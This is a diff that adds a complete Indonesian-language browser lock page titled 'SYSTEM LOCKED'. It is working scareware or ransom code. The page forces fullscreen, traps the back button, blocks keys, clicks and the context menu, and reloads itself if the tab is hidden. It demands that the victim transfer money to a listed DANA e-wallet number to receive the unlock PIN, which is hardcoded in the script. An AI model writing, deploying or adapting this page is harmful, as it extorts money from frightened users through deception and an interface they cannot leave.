@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>🔒 SYSTEM LOCKED</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black url('https://files.catbox.moe/m7acj7.jpg') center/cover no-repeat;
+      height: 100%;
+      font-family: monospace;
+      color: #0f0;
+      user-select: none;
+      cursor: none; /* sembunyikan kursor */
+    }
+
+    #freezeLayer {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      cursor: not-allowed;
+    }
+
+    input {
+      font-size: 28px;
+      padding: 10px;
+      border: 2px solid #0f0;
+      background: transparent;
+      color: #0f0;
+      text-align: center;
+      width: 180px;
+      letter-spacing: 4px;
+    }
+
+    button {
+      margin-top: 20px;
+      font-size: 18px;
+      padding: 8px 16px;
+      background: transparent;
+      color: #0f0;
+      border: 2px solid #0f0;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    button:hover:enabled {
+      background: #0f0;
+      color: black;
+    }
+
+    .fail {
+      margin-top: 15px;
+      color: red;
+      font-weight: bold;
+    }
+
+    .success {
+      color: lime;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false">
+
+  <div id="freezeLayer">
+    <h1>🔐 SYSTEM LOCKED</h1>
+    <p>Masukkan PIN untuk melanjutkan</p>
+    <p>Jika Ingin Mendapatkan Pin Segera Transfer Ke dana 083844528188</p>
+    <input type="text" id="pinInput" maxlength="10" disabled />
+    <button onclick="validatePIN()" disabled>UNLOCK</button>
+    <div id="status" class="fail">⏳ Sistem dikunci, tunggu sebentar...</div>
+  </div>
+
+<script>
+  const correctPIN = "hack123";
+  const pinType = /^[0-9]+$/.test(correctPIN) ? "angka" : "huruf";
+
+  window.onload = () => {
+    const input = document.getElementById("pinInput");
+    const button = document.querySelector("button");
+    const status = document.getElementById("status");
+
+    // Fullscreen paksa
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen();
+    }
+
+    // Cegah tombol back
+    history.pushState(null, "", location.href);
+    window.onpopstate = () => history.pushState(null, "", location.href);
+
+    // Delay freeze 1 menit
+    setTimeout(() => {
+      input.disabled = false;
+      button.disabled = false;
+      status.textContent = "";
+    }, 60000); // 1 menit = 60000 ms
+
+    // Loop redirect kalau dia reload / coba kabur
+    setInterval(() => {
+      if (document.hidden || document.visibilityState === "hidden") {
+        location.href = location.href;
+      }
+    }, 1000);
+  };
+
+  // Blok semua keyboard kecuali input
+  document.addEventListener("keydown", function (e) {
+    const isInput = e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA";
+    if (!isInput) e.preventDefault();
+  }, true);
+
+  // Blok klik di luar freezeLayer
+  document.body.addEventListener("click", (e) => {
+    const freeze = document.getElementById('freezeLayer');
+    if (!freeze.contains(e.target)) {
+      e.stopPropagation();
+      e.preventDefault();
+    }
+  }, true);
+
+  function validatePIN() {
+    const pin = document.getElementById("pinInput").value.trim();
+    const status = document.getElementById("status");
+
+    if (pinType === "angka" && /[a-zA-Z]/.test(pin)) {
+      status.textContent = "⚠️ PIN berupa angka";
+      return;
+    } else if (pinType === "huruf" && /^[0-9]+$/.test(pin)) {
+      status.textContent = "⚠️ PIN berupa huruf";
+      return;
+    }
+
+    if (pin === correctPIN) {
+      status.className = "success";
+      status.textContent = "✅ PIN benar, membuka sistem...";
+      setTimeout(() => {
+        document.exitFullscreen();
+        document.getElementById("freezeLayer").remove();
+      }, 1500);
+    } else {
+      status.className = "fail";
+      status.textContent = "❌ PIN SALAH! Keluar dari halaman...";
+      setTimeout(() => {
+        window.location.href = "https://google.com";
+      }, 2000);
+      // Mencegah keluar dari fullscreen pakai ESC
+document.addEventListener("keydown", function (e) {
+  if (e.key === "Escape") {
+    e.preventDefault();
+  }
+}, true);
+    }
+  }
+</script>
+</body>
+</html>
